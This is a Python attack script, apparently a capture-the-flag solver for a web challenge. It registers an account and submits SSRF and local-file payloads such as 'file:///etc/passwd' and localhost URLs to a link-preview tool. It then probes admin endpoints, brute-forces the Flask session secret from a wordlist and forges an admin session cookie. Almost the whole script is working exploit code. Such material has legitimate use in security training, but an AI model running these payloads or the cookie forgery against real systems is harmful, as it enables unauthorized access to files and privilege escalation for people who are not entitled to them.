#!/usr/bin/env python3
"""
Login and explore the application
"""

import requests
import time
import re
from bs4 import BeautifulSoup

BASE_URL = "http://23.179.17.92:5557"

# Register first
username = f"test_{int(time.time())}"
password = "StrongPassword123!"
email = f"{username}@test.com"
full_name = "Test User"

print(f"[*] Registering user: {username}")

session = requests.Session()
resp = session.post(f"{BASE_URL}/register", data={
    "full_name": full_name,
    "username": username,
    "email": email,
    "password": password
})

print(f"[+] Registration: {resp.status_code}")

# Now login
print(f"\n[*] Logging in...")
resp = session.post(f"{BASE_URL}/login", data={
    "username": username,
    "password": password
}, allow_redirects=True)

print(f"[*] Login status: {resp.status_code}")
print(f"[*] Final URL: {resp.url}")
print(f"[*] Cookies: {dict(session.cookies)}")

if 'session' in session.cookies:
    print(f"\n[+] SUCCESS! Got session cookie!")
    cookie = session.cookies['session']
    print(f"[+] Cookie value: {cookie[:100]}...")
    
    # Access dashboard
    print(f"\n[*] Accessing dashboard...")
    resp = session.get(f"{BASE_URL}/dashboard")
    print(f"[*] Dashboard: {resp.status_code}")
    
    # Check for flags
    if 'CIT{' in resp.text:
        flags = re.findall(r'CIT\{[^}]+\}', resp.text)
        print(f"[+] FOUND FLAGS IN DASHBOARD: {flags}")
    
    # Access link preview tool
    print(f"\n[*] Accessing link preview tool...")
    resp = session.get(f"{BASE_URL}/tools/link-preview")
    print(f"[*] Link preview: {resp.status_code}")
    
    if 'CIT{' in resp.text:
        flags = re.findall(r'CIT\{[^}]+\}', resp.text)
        print(f"[+] FOUND FLAGS IN LINK PREVIEW: {flags}")
    
    # Try to submit a link preview request
    print(f"\n[*] Testing link preview with localhost...")
    test_urls = [
        'http://localhost/flag',
        'http://127.0.0.1/flag',
        'file:///etc/passwd',
        'file:///flag.txt',
        'http://localhost:5000/flag',
    ]
    
    for url in test_urls:
        resp = session.post(f"{BASE_URL}/tools/link-preview", data={
            "target_url": url
        })
        print(f"[*] Submitted: {url} -> {resp.status_code}")
        if 'CIT{' in resp.text:
            flags = re.findall(r'CIT\{[^}]+\}', resp.text)
            print(f"[+] FOUND FLAGS: {flags}")
    
    # Try admin endpoints
    print(f"\n[*] Trying admin endpoints...")
    admin_endpoints = [
        '/admin',
        '/admin/dashboard',
        '/admin/flag',
        '/flag',
        '/api/flag',
        '/api/admin',
        '/internal/flag',
    ]
    
    for endpoint in admin_endpoints:
        resp = session.get(f"{BASE_URL}{endpoint}")
        print(f"[*] {endpoint}: {resp.status_code}")
        if resp.status_code == 200 and 'CIT{' in resp.text:
            flags = re.findall(r'CIT\{[^}]+\}', resp.text)
            print(f"[+] FOUND FLAGS: {flags}")
    
    # Now let's try to brute force the Flask secret
    print(f"\n[*] Attempting to brute force Flask secret...")
    from itsdangerous import URLSafeTimedSerializer, BadSignature
    
    wordlist = [
        'secret', 'dev', 'debug', 'test', 'password', 'admin', 'flask',
        'signup', 'enjoy', 'signupandenjoy', 'campaign', 'city', 'cit',
        'secret_key', 'secretkey', 'key', 'mysecret', 'supersecret',
        'development', 'production', 'default', 'change_me', 'changeme',
        '123456', 'password123', 'admin123', 'secret123',
        'linkpreview', 'workspace', 'dashboard',
        '10splayaSec2',  # Challenge author
    ]
    
    for secret in wordlist:
        try:
            serializer = URLSafeTimedSerializer(secret)
            data = serializer.loads(cookie)
            print(f"\n[+] FOUND SECRET KEY: {secret}")
            print(f"[+] Decoded data: {data}")
            
            # Forge admin session
            admin_data = {
                "role": "admin",
                "uid": data.get('uid', 'u_admin'),
                "username": "admin"
            }
            admin_cookie = serializer.dumps(admin_data)
            print(f"[+] Forged admin cookie: {admin_cookie[:100]}...")
            
            # Try with admin cookie
            admin_session = requests.Session()
            admin_session.cookies.set('session', admin_cookie)
            
            for endpoint in admin_endpoints:
                resp = admin_session.get(f"{BASE_URL}{endpoint}")
                print(f"[*] Admin {endpoint}: {resp.status_code}")
                if 'CIT{' in resp.text:
                    flags = re.findall(r'CIT\{[^}]+\}', resp.text)
                    print(f"[+] FOUND FLAGS WITH ADMIN: {flags}")
            
            break
        except (BadSignature, Exception):
            continue
    
else:
    print("\n[-] No session cookie after login")
